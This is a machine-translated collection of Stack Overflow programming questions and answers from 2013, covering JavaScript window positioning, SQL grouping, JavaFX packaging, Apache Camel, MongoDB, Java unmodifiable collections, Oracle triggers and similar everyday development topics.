如果我确实有这样的图像按钮呼叫：

onclick="window.open('link','width=615,resizable,scrollbars').focus(); return false;

除了操作按钮，我如何才能打开它？或者如何在点击时获得鼠标光标位置？

事件在这里不起作用 onclick="window.open('link','width=615,resizable,scrollbars, **left=e.pageX** ').focus();

也不能在这里工作 onclick="window.open('link','width=615,resizable,scrollbars').moveTo(e.pageX,0);

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:21:11.957

您可以使用以下元素：

event.pageX 和 event.pageY 获取相对于文档的坐标

您可以在此处查看更多详细信息： [mozilla.org - pageX](https://developer.mozilla.org/en-US/docs/DOM/event.pageX)

obs：代码中的“e”代表“事件”，尝试将其更改为事件，如果您尝试通过 css 插入左侧/顶部值，则需要添加 +'px' 进行连接，因为 event.page只返回数字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:44:54.723

How about looking [here](http://docs.jquery.com/Tutorials%3aMouse_Position) for mouse position

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:52:22.213

检查此链接以获取鼠标位置 [onMouseMove 获取鼠标位置](https://stackoverflow.com/questions/3011418/onmousemove-get-mouse-position)

你可以给onclick事件附加一个函数，在函数中你可以调用window.moveTo(x, y) 将窗口移动到你需要的位置

```
 function openWindow() {
    var win = window.open(...);
    win.moveTo(x, y);
 } 
```

# sql-server - 在另一个条件下选择 max(date)

> ID：15111040
> 
> 赞同：0
> 
> 时间：2013-02-27T11:33:18.187
> 
> 标签：sql-server, date, filter

好的，所以基本上这是我的表：

```
order   date
11111   date1
11111   date2
11111   date3
22222   date4
22222   date5
22222   date6 
```

好的，所以我需要我的查询来输出以下内容：

```
order   date
11111   date3
22222   date6 
```

date3 和 6 是其各自订单的最新日期。我设法过滤了最新的日期，但它通常只会输出具有最新日期的行，而不是按 column1 分组/排序。

它返回

```
order   date
22222   date6 
```

当 date6 是列中的最新日期时。

顺便说一句，我使用 ms sql server 2012

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:47:21.500

正如[@Alex K 评论](https://stackoverflow.com/questions/15111040/select-maxdate-within-another-condition/15111327#comment21262253_15111040)的那样，您可以使用[`GROUP BY`](http://msdn.microsoft.com/en-gb/library/ms177673.aspx)聚合[函数](http://msdn.microsoft.com/en-us/library/ms173454.aspx)，例如[`MAX()`](http://msdn.microsoft.com/en-us/library/ms187751.aspx).

因此，您可以返回具有每个订单最大日期的结果集：

```
SELECT [order], MAX(date) as maxdate
FROM Table
GROUP BY order 
```

使用您的表格，您将获得以下结果集：

```
order   maxdate
11111   date3
22222   date6 
```

# java - 如何获取与依赖 jar 捆绑在一起的可执行 javafx jar？

> ID：15111043
> 
> 赞同：2
> 
> 时间：2013-02-27T11:33:20.400
> 
> 标签：java, ant, javafx-2, packaging, executable-jar

我制作了一个 javafx 应用程序表单，我得到了一个可执行的 jar 作为输出。现在我的 javafx 应用程序依赖于两个 3rd 方 jar，例如 commons.io.2.4.jar。

目前要运行我的应用程序，我必须像这样将这些依赖 jar 保存在我的可执行 jar 的类路径中

```
--------Application.jar
----------[Classpath Folder]\dependend.jar files 
```

**但我希望所有依赖的 jar 都捆绑在我的可执行 jar 本身中。**

由于 javafx 使用 ant build 我尝试使用

```
 <jar destfile="application.jar">
        <zipfileset src="Dependent.jar" />
 </jar> 
```

但是在捆绑了所有依赖的 jar 之后，我没有得到可执行的 jar。我不知道问题出在哪里。

我也尝试`<fx:jar> </fx:jar>`了相同的标签，但无法弄清楚如何完全满足我的要求。

这是清单文件的样子：

```
Manifest-Version: 1.0
implementation-vendor: dhruv1767
JavaFX-Version: 2.2
implementation-title: LogsDeObfuscator
implementation-version: 1.0
JavaFX-Application-Class: com.liaison.controller.LogsDeObfuscator
JavaFX-Class-Path: lib/allatori.jar lib/commons-io-2.4.jar
Created-By: JavaFX Packager
Main-Class: com/javafx/main/Main

Name: com/javafx/main/Main.class
SHA-256-Digest: j0IuLabX3l0TgeO1+UqESD6fWA09lNsuiTtr4eue1HU=

Name: com/liaison/controller/LogsDeObfuscator.class
SHA-256-Digest: AysvgvCJeJoRdCpqu1xC8JDKttGWUQR4ce8jVW/kLDY=

Name: com/liaison/controller/Delta.class
SHA-256-Digest: TkQcfU1YWr6UwkiIj2IJpFi4UirQK7pDL26pVnAjVYM= 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T16:43:29.403

需要注意的一件事是，任何依赖 JAR 本身是否包含清单。

```
<jar destfile="application.jar">
    <zipfileset src="Dependent.jar" excludes="META-INF/MANIFEST.MF/>
</jar> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T16:18:42.880

在为此使用 exe4j 之前，我遇到了同样的问题，我已经添加了所有需要的 jar，并且 exe4j 将所有这些 jar 捆绑在一起。这对我有用。确保在添加 jar 时添加 main Jar 的 Main 类路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-28T17:47:12.580

试试这个：

[http://www.zenjava.com/2012/11/24/from-zero-to-javafx-in-5-minutes/](http://www.zenjava.com/2012/11/24/from-zero-to-javafx-in-5-minutes/)

Maven 是必需的，但会使添加您的 Commons IO 依赖项变得轻而易举。

按照指示，我能够为 Ubuntu 制作可执行的 JAR 和本机安装程序。可执行 JAR 生成是使用以下命令完成的：

```
mvn jfx:build-jar 
```

从链接工作中获取示例项目。然后将依赖项添加到 POM 文件中。

```
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.4</version>
</dependency> 
```

然后，您可以将现有代码移动到 Maven 托管 JavaFX 项目。

更多详细信息在链接上，但要生成本机安装程序，请运行以下命令：

```
mvn jfx:build-native 
```

# apache-camel - 如何在java dsl中访问（获取）camel header

> ID：15111044
> 
> 赞同：3
> 
> 时间：2013-02-27T11:33:21.733
> 
> 标签：apache-camel

我有一个像 -

```
 // use streaming to increase index throughput
            .setHeader(SolrConstants.OPERATION,
                    constant(SolrConstants.OPERATION_INSERT_STREAMING))
            // define solr endpoint and options
            .to("solr://"
                    + getSolrEndPoint()
                    + "?defaultMaxConnectionsPerHost=500&streamingThreadCount=500&maxRetries=3")
            .log(LoggingLevel.INFO, "Successfully indexed document id [" +header(BatchHeaders.DOCUMENT_ID) +"]")
            // end this route
            .end(); 
```

但我在日志中得到的是 -

```
severity="INFO " thread="Camel (camel-1) thread #123 - seda://insert" category="route2" Successfully indexed document id [header{DOC_ID}] 
```

我没有得到实际的标题值（文档 ID）。
所以我的问题是 - 如何在这里访问 Java DSL 中的标头？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T12:22:24.393

DSL 中的日志使用简单的语言：[http](http://camel.apache.org/simple) ://camel.apache.org/simple 。

所以你需要这样做：

```
 .log(LoggingLevel.INFO, "Successfully indexed document id [${header." + BatchHeaders.DOCUMENT_ID + "}]") 
```

例如，`${header.xxx}`在运行时由简单语言评估。

# jquery - JQuery：鼠标悬停时向下滑动图像

> ID：15111048
> 
> 赞同：2
> 
> 时间：2013-02-27T11:33:44.240
> 
> 标签：jquery, css, slider

我正在使用的小提琴：http: [//jsfiddle.net/Hu4bg/1/](http://jsfiddle.net/Hu4bg/1/)

我正在尝试创建一个垂直菜单，当您将鼠标悬停在链接上时，我希望图像（一个 div 会更好，因为它有内容）向下滑动并且它永远不会再次向上滑动，而是当另一个链接是悬停时，它将在最后一个向下滑动的图像上向下滑动。

我想我应该更改 z-index 值，但我不知道如何通过 JQuery 控制这个东西。你能给我一个关于我的小提琴的快速提示吗？

```
$(document).ready(function() {
    $("#leftmenu a").hover(function() {
        $("#img1").slideDown(250);
    });

    $("#leftmenu a").mouseleave(function() {
        $("#img1").slideUp(250);
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:00:59.993

你的意思是这样吗？[http://jsfiddle.net/Hu4bg/3/](http://jsfiddle.net/Hu4bg/3/)

我已将代码压缩为一个事件并**更改了它的工作方式**（将多个图像框的 id 与链接的类匹配）：

```
$("#leftmenu a").hover(function() {
    $("[id^=img]:not([id=" + $(this).attr("class") + "])").slideUp(250);
    $("#" + $(this).attr("class")).slideDown(250);
}); 
```

我还添加了另外 2 个`img`标签，其 ID 与标签中的类匹配`a`：

```
<div id="img1">Image here</div>
<div id="img2">Image here</div>
<div id="img3">Image here</div>

<ul>
    <li> <a class="img1" href="#">Image 1</a></li>
    <li> <a class="img2" href="#">Image 2</a></li>
    <li> <a class="img3" href="#">Image 3</a></li>
</ul> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:43:49.407

`.hover`有两个参数。一个用于鼠标进入，另一个用于鼠标离开。

```
$("#leftmenu a").hover(function() {
    $("#img1").slideDown(250);
}, function() {
    $("#img1").slideUp(250);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:58:29.480

您实际上可以通过使用纯 css 来做到这一点`CSS Animation`。

这是一个[现场演示](http://jsfiddle.net/danield770/Hp9gp/1/)。

# java - 使用 POST 消费的 RESTful Web 服务

> ID：15111050
> 
> 赞同：1
> 
> 时间：2013-02-27T11:33:54.590
> 
> 标签：java, web-services, rest

我在 UI 部分使用 SDF 框架和 Java 技术，如 JAXB、extJS。

我有端点，现在我需要使用 RESTful Web 服务通过将输入作为 xml 发送并将输出作为 xml 来使用它。

我对 RESTful Web 服务非常陌生。请不要告诉我准备好关于 REST 的整本书 :) 而是建议我如何在 SDF（服务开发框架）中实现它。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:41:02.097

See [this](http://www.vogella.com/articles/REST/article.html) article and specially restful webservices and jax b ..Write a client to consume your service through java you can use Apache http client and parse your xml using jaxb

# mongodb - MongoDB 使用具有多个元素条件的 $ 位置运算符？

> ID：15111052
> 
> 赞同：0
> 
> 时间：2013-02-27T11:34:01.823
> 
> 标签：mongodb

鉴于此文档结构（对象数组）：

```
{
  "_id" : "2",
  "users" : [{
      "_id" : "1",
      "x"   : "1",
      "y"   : "2",
      "name": "blah"
    }, {
      "_id" : "2",
      "x"   : "2",
      "y"   : "2",
      "name": "blah"
    }],
} 
```

我知道我可以做这样的事情来替换数组中的特定文档：

```
coll.update( {'_id':'2', 'users._id':'2'}, {$set:{'users.$':{"name":"blahblah",... }}}, false, true) 
```

**但是，当指定两个必须都为真的元素级别标准时，是否可以这样做？**（即 x 和 y）。我只见过一个例子，我似乎无法让它工作。也许是这样的？：

```
coll.update( {'_id':'2', 'users.x':'2', 'users.y':'2'}, {$set:{'users.$':{"name":"blahblah",... }}}, false, true) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:17:15.807

当您想匹配同一文档中的两个字段时，您需要使用[$elemMatch](http://docs.mongodb.org/manual/reference/operator/elemMatch/)运算符。

您的查询（where）谓词将是：

```
{ _id: 2, users : {$elemMatch : {x:2, y:2} } } 
```

# php - 在生成水印 PHP GDLib 时调整图像大小

> ID：15111057
> 
> 赞同：0
> 
> 时间：2013-02-27T11:34:09.387
> 
> 标签：php, css, image-gallery

我正在编写一个脚本来获取图片库

我已经有一个图像文件夹，一些肖像，一些风景。

该脚本在 foreach 循环中运行以生成图像库。

我可以创建一个完全相同大小的图像，并且我的水印覆盖有这段代码

```
$im = imagecreatefromjpeg($path);

$font = $font_path;
$size = 25;

$data = getimagesize($path);
$width = $data[0];
$height = $data[1];

// watermark positioning

if($width > $height){

  $width = $width / 8;

  $width = $width * 2;

  } else {

  $width = $width / 8;

  $width = $width * 1.2;

  }

$height = $height / 8;

$height = $height * 4.35;

// end watermark positioning

$temp_file = rand(100000000, 999999999).'.jpg';

# calculate maximum height of a character 
$bbox = imagettfbbox($size, 0, $font, 'ky');
$x = 8; $y = 8 - $bbox[5];
$x = $x + $width;
$y = $y + $height;

$text = 'WATERMARK TEXT';
shadow_text($im, $size, $x, $y, $font, $text);

imagejpeg($im, $temp_dir.'/'.$temp_file, 90); 
```

此代码完美运行，但每个图像都保存为原始大小（通常很大 - 这会浪费带宽，因为我只需要 gdlib 生成的图像很小）

我的问题是有些是横向的，有些是纵向的。

图片应该是方形的，如果是横向图片，则上下有黑色水平边框，如果是纵向图片，则左右有黑色垂直边框

我想要每个图像的 div，div 内部，图像（200 x 200px）和它下面的专辑名称。

我可以制作包含图像的 div，与

```
style="display: inline;" 
```

但是，只要我在 div 中添加任何文本，它们就会跳到每张图像一行。

当我在 joomla 模板中使用自定义 php/html 时，这可能会变得更加困难，因此 css 已经设计好了。

关于我将如何解决这个问题的任何建议？

我基本上希望它在您搜索时看起来像 ebays 的“画廊视图”。

多谢你们 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:43:34.540

您应该使用 imagecopyresampled 重新缩放图像以获得缩略图。

当您调整图像大小时，您可以检测横向/纵向并添加顶部+底部条带或左右条带，或者仅将图像中心保留为缩略图。

将原始图像保存在一个地方并在另一个地方创建缩略图以准备好它们。

# windows - geanyvc 在 Windows 上

> ID：15111061
> 
> 赞同：0
> 
> 时间：2013-02-27T11:34:19.057
> 
> 标签：windows, git, geany

我已经在 Windows 7 64bit 中安装了 Geany (1.22) 和 GTK+ 包的 geanyvc 插件，它在 Geany 内部提供了版本控制功能，但是我不能使用插件的功能；菜单条目显示为灰色。Geany 似乎无法识别我的存储库（我正在使用 git）。我尝试在本地克隆中打开一个现有文件并在其中创建一个新文件，但结果是相同的。

在网上搜索我没有发现任何有用的东西，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T00:21:24.377

我认为这个插件依赖于 git。你可以从这个网站下载 git for windows：http: [//msysgit.github.io/](http://msysgit.github.io/)

而且，我认为您必须编辑 %PATH% 变量，以便插件找到 git 可执行文件。

另外，请查看 geany-users 邮件列表中的讨论：http: [//geany-users.466218.n3.nabble.com/Geany-VC-on-Windows-td3046632.html](http://geany-users.466218.n3.nabble.com/Geany-VC-on-Windows-td3046632.html)。它可能会回答一些问题。

哦，使用这个邮件列表。你肯定会得到一个快速的答案。

# iphone - 从 MVC (iOS) 中的异步操作返回结果

> ID：15111064
> 
> 赞同：1
> 
> 时间：2013-02-27T11:34:28.283
> 
> 标签：iphone, ios, objective-c, model-view-controller

我有这个问题：我的控制器要求我的模型为我加载一些数据，因为控制器需要这些数据来填充视图。模型向数据存储询问数据，然后再次查询数据库。我的模型发送一个块，其中包含处理结果的逻辑。

然后问题来了；如何将此数据返回给控制器？由于它是异步的，所以我不能在块内或块外放一个 return，因为我不知道它什么时候完成。

我考虑过两种解决方法；

*   让 Controller 将一个块作为回调传递给我的模型，然后它再次在自己的回调块中调用该回调。
*   让我的模型发布我的控制器可以收听的通知。

有没有人对此有很好的解决方案？

编辑：尝试澄清列表中的#1（没有任何代码）：我的控制器调用，比如说，`saveStuff:callback:`在模型中并传递`stuff`和一个回调块。然后模型要求数据存储保存`stuff`并将它自己的回调传递给数据存储。然后我要做的是在模型回调中调用控制器回调。这更有意义吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:55:00.607

最好的解决方案是将块作为完成处理程序传递给模型，然后调用它。像这样的东西

```
// model implementation
-(void)loadDatabaseOnCompletion:(void(^)(id result))completionHandler {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // loading data from server
        completionHandler(result);
    });
}

...
// from ViewController
[model loadDatabaseOnCompletion:^(id result) {

}]; 
```

# sml - SML/NJ - 关于 ":=" 运算符

> ID：15111067
> 
> 赞同：0
> 
> 时间：2013-02-27T11:34:35.900
> 
> 标签：sml, smlnj

我对操作员做了一些检查`:=`，我想确保我做得很好。

让 -

```
val r1 = ref 1 ;  (* !r1 = 1 *)
val r2 = ref 2 ;  (* !r2 = 2 *)
val r3 = ref 3 ;  (* !r3 = 3 *)

r1 := !r2 ; (* !r1 = 2 *)
r2 := !r3 ; (* !r2 = 3 *)
!r1 ;  (* still !r1 = 2 *) 
```

显然我认为这 `r2 := !r3 ;`也会导致`!r1`value 发生变化，但这并没有发生，所以它似乎`r1 := !r2 ;`没有指向`r1`相同的地址`r2` ，而只是为其分配新内存`!r1`并在那里设置`2`值。

我对吗 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:24:56.173

赋值不分配新内存。之后`r1 := !r2`，引用`r1`“指向”`2`取自的值`r2`，而不是指向`r2`自身。因此，`r2`稍后更新不会影响它。

如果你想要这样的效果，那么你必须使用另一种间接方式，例如`int ref ref`类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T19:44:29.257

是的。`r1`并被`r2`初始化为指向不同的数据结构。`:=`运算符只是更改左侧指向的 ref 结构的值。如果你想`r1`和`r2`指向同一个 ref 结构，你可能`r1`最初没有定义，然后像`val r1 = r2`. ML 中的变量在初始定义后就无法赋值。

# sql - Oracle 触发器而不是更新和 ORA-22816 错误

> ID：15111071
> 
> 赞同：3
> 
> 时间：2013-02-27T11:34:59.423
> 
> 标签：sql, oracle, delphi, view, triggers

我正在开发一个 Delphi 应用程序，使用 TcxGrid 来操作来自视图 VM_TEST 的数据和 Oracle DB 上的 INSTEAD OF UPDATE 触发器来更新它。

这是视图的代码：

```
create or replace view VM_TEST 
AS   
select
  t_merce_ass.id_merce,
  t_merce_ass.id_posizione,
  t_merce_ass.prezzo,
  t_tipo_merci.nome
from
  t_merce_ass,
  t_tipo_merci
where
  t_tipo_merci.id_merce = t_merce_ass.id_merce 
```

这是代替触发器：

```
create or replace trigger TG_UPDATE_VM_TEST
instead of update on VM_TEST
for each row
begin   
  update
    t_tipo_merci
  set
    t_tipo_merci.nome = :NEW.nome
  where
    t_tipo_merci.id_merce = :OLD.id_merce;
  update
    t_merce_ass
  set
    t_merce_ass.prezzo = :NEW.prezzo
  where
    t_merce_ass.id_merce = :OLD.id_merce
    and
    t_merce_ass.id_posizione = :OLD.id_posizione;
end TG_UPDATE_VM_TEST; 
```

现在更新工作正常，通过 sqlplus 但它不适用于网格，因为它使用返回子句执行更新（使用 Oracle Monitor 记录）：

```
00:31.996   00:00.001   Query.Execute update VM_TEST  set PREZZO = :v3  where rowid = :doa__rowid  returning rowid into :doa__rowid 
```

它会引发**ORA-22816**异常 ( `Unsupported feature with RETURNING clause`)。

如何解决问题？有没有办法在这种类型的触发器中返回 rowid 以使网格的更新命令起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T08:02:44.040

根据[Direct Oracle Access 论坛](http://forums.allroundautomations.com/ubb/ubbthreads.php?ubb=postlist&Board=1&page=1)（搜索 ORA-22816），您可能必须设置 UniqueFields 属性。

# java - Collections.unmodifiableList 和防御性副本

> ID：15111073
> 
> 赞同：48
> 
> 时间：2013-02-27T11:35:09.150
> 
> 标签：java, collections, unmodifiable

如果我写

```
List<Integer> a1 = Arrays.asList(1, 2, 3);
List<Integer> a2 = Collections.unmodifiableList(a1); 
```

`a2`是只读的，但如果我写

```
a1.set(0,10); 
```

然后`a2`也被修改。

如果在 API 中说：

> 返回指定集合的​​不可修改视图。此方法允许模块为用户提供对内部集合的“只读”访问权限。

那么，为什么如果我修改原始集合也修改了目标复制的集合？

也许我误解了它的含义，如果是这样，那么编写该集合的防御性副本的方法是什么？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2013-02-27T11:39:41.067

是的，你理解正确。这个想法是`umodifiableCollection`不能直接更改返回的对象，但可以通过其他方式更改（有效地通过直接更改内部集合）。

只要有东西可以访问内部列表，就可以更改“不可修改”的集合。

这就是为什么您*通常*构建一个不可修改的集合并确保没有任何东西可以进入内部列表：

```
Collection<Integer> myUmodifiableCollection = Collection.umodifiableCollection(Arrays.asList(1, 2, 3)); 
```

由于没有任何东西可以引用`List`created by `asList`，因此这是一个真正不可修改的集合。

这种方法的优点是您根本不需要复制原始集合/列表，从而避免了使用内存和计算能力。

[Guava](https://code.google.com/p/guava-libraries/)提供了[`ImmutableCollection`](https://google.github.io/guava/releases/21.0/api/docs/com/google/common/collect/ImmutableCollection.html)类（及其子类，例如[`ImmutableList`](https://google.github.io/guava/releases/21.0/api/docs/com/google/common/collect/ImmutableList.html)），它们提供了真正的不可变集合（通常通过复制源代码）。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-02-27T11:38:18.237

> 也许我误解了它的含义，如果是这样，那么编写该集合的防御性副本的方法是什么？

通常，您会这样使用它：

```
private List<Integer> a1 = Arrays.asList(1, 2, 3);

public List<Integer> getUnmodifiable() {
    return Collections.unmodifiableList(a1);
} 
```

调用`getUnmodifiable` **但**无权访问您的类内部的人（即他们无法访问私有变量`a1`）将无法修改返回的列表。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-10-28T20:34:59.107

如果您希望在`a1`没有 Guava 的情况下保持可变并制作它的不可变副本，这是您可以做到的一种方法。

```
 List<Integer> a1 = Arrays.asList(1, 2, 3);
    List<Integer> a2 = Collections.unmodifiableList(new ArrayList<>(a1)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T11:37:21.777

这个想法是你不能通过`a2`.

修改`a1`列表确实会修改您在其中看到的内容`a2`- 这是有意的。

只是没有公开的方式来访问列表`a1`，你应该有你想要的:)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-27T11:37:44.730

API说它是**内部集合**在你的情况下集合不是内部的

关键是，当您在类中有一个私有列表以及该列表的 gettet 时，您可能希望 getter 的调用者无法修改列表，以防万一您必须返回一个不可修改的列表。否则返回的列表只是对您的内部/私人列表的引用，因此可以修改其内容。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-27T11:40:08.600

该声明：

```
Collections.unmodifiableList(a1); 
```

返回原始集合的包装器，其修饰符方法 throw `UnsupportedOperationException`。

包装器是通读的，这意味着如果您修改`a1`，更改将反映在包装的集合上`a2`。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-02-27T11:40:01.627

`a1`并将`a2`引用相同的数据（内存）。

不可修改的部分来了，只有`a2`作为条目。

如果您传递`a2`给您期望该方法是幂等的方法，则进行成像。这种情况`a2`会有所帮助。

总之，您不能使用`a2`指针修改数据。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-11-22T12:09:13.167

如果您需要不可修改和不可变列表，或者换句话说，源列表的不可修改副本不依赖于其他库，请尝试以下操作：

```
Collections.unmodifiableList(Collections.list(Collections.enumeration(sourceList))) 
```

`Collections.list()`从其枚举中复制值。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-01-22T15:17:54.333

从 Java 10 开始，您可以这样做`List.copyOf()`：

```
List<Integer> a1 = Arrays.asList(1, 2, 3);
List<Integer> a2 = List.copyOf(a1); 
```

之后，`a1`通过 看不到对 的更改`a2`，因为会将`List.copyOf()`列表的内容复制到新的。副本不可修改。但请务必在使用该方法之前阅读有关该方法的文档，因为它不适用于包含`null`值的列表。

# php - Ajax 脚本无法正常工作

> ID：15111074
> 
> 赞同：0
> 
> 时间：2013-02-27T11:35:12.253
> 
> 标签：php, javascript, ajax, html, jquery

我是ajax新手

我有这个脚本，我想知道它的作用......大行我已经弄清楚了，但它仍然无法正常工作。

脚本如下：

```
function calcPrice(elem,id,pret,i){

$.ajax({
   type: "POST",
   url: "ajaxHandler.php",
   data: "action=calcPrice&sign="+elem.className+"&id="+id+"&pret="+pret,
   success: function(msg){
    hcont = get_response_tag('tag1',msg);
    hcont2 = get_response_tag('tag2',msg);
     $(".price_val").html(hcont);  
     $(".nb_analize").html(hcont2);  

    if(elem.className=='plus'){ $("#p_row_"+i).removeClass("row_plus").addClass("row_minus"); elem.className = 'minus'; }
    else{  $("#p_row_"+i).removeClass("row_minus").addClass("row_plus"); elem.className = 'plus'; }
   }
});

} 
```

我应该写一些东西`ajaxHandler.php`让这个脚本工作吗？

html看起来像这样......（部分）

```
<div id="p_row_10" class="tableRow4 ">
    <div class="tableRow4_leftBg float-left">10</div>
    <div class="tableRow4_middleBg2 float-left">Ac. anti adenovirus</div>
    <div class="tableRow4_middleBg3 float-left">73.00</div>
    <div class="tableRow4_middleBg4 float-left">
        <div class="plus" onclick="calcPrice(this,36,73.00,10)"></div>
    </div>
</div>   

<div id="p_row_11" class="tableRow4 ">
    <div class="tableRow4_leftBg float-left">11</div>
    <div class="tableRow4_middleBg2 float-left">Ac. anti ADN dublu catenar </div>
    <div class="tableRow4_middleBg3 float-left">79.00</div>
    <div class="tableRow4_middleBg4 float-left">
        <div class="plus" onclick="calcPrice(this,37,79.00,11)"></div>
    </div>
</div>   

<div align="right">
    <div class="cp_pret" >
        <div class="t">TOTAL</div>
        <div class="p"><span class="price_val">0</span> LEI</div>
    </div>
</div>
</div> 
```

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:41:25.393

ajaxHandler.php 是此 ajax 请求正常工作所必需的。如果没有 ajaxHandler.php 文件，就会出现 404 错误。此外，ajaxHandler.php 产生的输出由 ajax 请求成功函数中的 msg 变量保存。

# phpmyadmin - 理解不同管理系统的困惑

> ID：15111079
> 
> 赞同：0
> 
> 时间：2013-02-27T11:35:30.173
> 
> 标签：phpmyadmin, django-admin, admin

我看了一些关于使用 PHP 制作动态网站的教程。现在他们做的第一件事是，他们设置了一个叫做 phpMyAdmin 的东西，然后开始建立一个网站。现在，当我看到该视频中的管理界面时，我想到了完全不同的 Wordpress 管理界面。然后，经过一番谷歌搜索，我了解到 Wordpress admin 与 phpMyAdmin 完全不同。

好的，现在让我们选择 Facebook。Mark Zuckerberg 是否设计了自己的管理系统 [类似于 Wordpress admin] 来管理网站，还是使用 phpMyAdmin？

现在，有 django。我浏览了它的教程，发现它已经有了一个“强大的”管理功能。现在我不明白它是类似于 phpMyAdmin 还是不同（因为两者看起来很相似）？（是的，在发布这个问题之前，我经历了一些关于使用 django admin 和 phpMyAdmin 的其他问题，但我没有弄清楚我的疑问）。

让我吃惊的另一件事是，如果我想制作一个类似于 Wordpress 的 CMS，或者说，就像 Wordpress 一样，并且我希望它提供 Wordpress 的所有功能，并且我不需要 django 管理系统（与 Wordpress 管理界面相比，它的界面真的很可怜），所以我可以设计自己的管理系统还是只需要使用 django admin？

真的，我很迷茫和迷茫。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:44:23.710

phpMyAdmin is just a web-based client for managing mySql. if you are attempting to make a CMS, from scratch you will likely want to familiarize yourself with this or another tool for managing your DB. do not confuse the two though, they are not even related. phpMyAdmin is not a CMS, it is a database tool.

the question is, if you want to create a CMS just like wordpress, why not just use wordpress?

# c# - 在 C# 中实现 SQRT

> ID：15111080
> 
> 赞同：-2
> 
> 时间：2013-02-27T11:35:32.123
> 
> 标签：c#, sqrt

我需要知道 Microsoft 是如何在 c# 中实现 Math.Sqrt 平方根函数的。有谁知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:38:58.100

`sqrt()`C#从`<cmath>`C++调用本机。

获取 CLR 的源代码来证明这一点！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:46:15.770

[这](http://en.wikipedia.org/wiki/Square_root#Computation)有关于平方根的完整信息（算法级别）

# eclipse - “svn:ignore”在 Eclipse 中是如何工作的？

> ID：15111082
> 
> 赞同：1
> 
> 时间：2013-02-27T11:35:46.057
> 
> 标签：eclipse, svn, subclipse

我在 Eclipse 中使用 SVN:IGNORE 有两个问题

(1) 有时“添加到 SVN：忽略”上下文菜单选项是灰色的，所以我不知道为什么我不能将文件夹添加到 SVN 忽略。

我有一些特定于 IDE 的垃圾，例如“/.idea”或“.settings”，带有“+”符号，所以它还没有在 SVN 中。那么为什么 Svn:ignore 选项是灰色的呢？

(2) 当 Eclipse 确实给了我忽略某些内容的选项时，我会看到三个选项。

1.  按名称的资源。但它并没有给我任何我想忽略哪些资源的迹象。
2.  通配符扩展。同样，它没有告诉我我的通配符是什么。
3.  自定义图案。在这里我可以猜测指定模式，例如 *.idea 和 *.settings。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:45:59.133

相关文件或文件夹已添加到 SVN。

请注意，您可以添加尚未提交的文件（由您看到的蓝色加号表示）。

您忽略文件的选项是您描述的选项，每个符合此条件的文件都不能再添加到 SVN。

简而言之：

*   将文件添加到 svn:ignore 将阻止它被添加到存储库
*   将文件添加到 SVN 后，在恢复添加之前不能再忽略它
*   一旦文件被提交到 SVN，它就不能再被忽略，直到从存储库中删除该文件

从 Subclipse 手册页中引用您的忽略选项是：

要忽略特定资源，请选择您希望忽略的文件和/或文件夹，然后在 Team 菜单中选择 Add to svn:ignore。这将弹出一个选项，您可以在其中选择如何忽略文件：

*   按名称（仅选定的资源）
*   通过通配符扩展（基于所选资源）
*   通过您输入的自定义模式（例如 log*.txt）

如有疑问，请选择第一个选项 Resource(s) by name，因为它永远不会忽略未明确选择的资源。

# asp.net-mvc - asp.net mvc 中 Ajax.BeginForm 的 Jquery 脚本文件是什么

> ID：15111083
> 
> 赞同：1
> 
> 时间：2013-02-27T11:35:46.920
> 
> 标签：asp.net-mvc

我正在使用 Ajax.BeginForm

```
using (Ajax.BeginForm("checklogin", "home", null, new AjaxOptions { 
    UpdateTargetId = "resultId",   
    HttpMethod="Post" }, new { id = "_forgetForm" }
)) 
```

但结果显示在下一页

我已经包括

```
<script src="<%: Url.Content("~/Scripts/MicrosoftAjax.js") %>" type="text/javascript"></script>

<script src="<%: Url.Content("~/Scripts/MicrosoftMvcAjax.js") %>" type="text/javascript"></script> 
```

但没有效果什么是 .js 文件以及使用 Ajax.BeginForm 的顺序

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T14:15:35.510

您只需要按该顺序 2 个脚本：

```
1) jquery-1.7.1.min.js
2) jquery.unobtrusive-ajax.js 
```

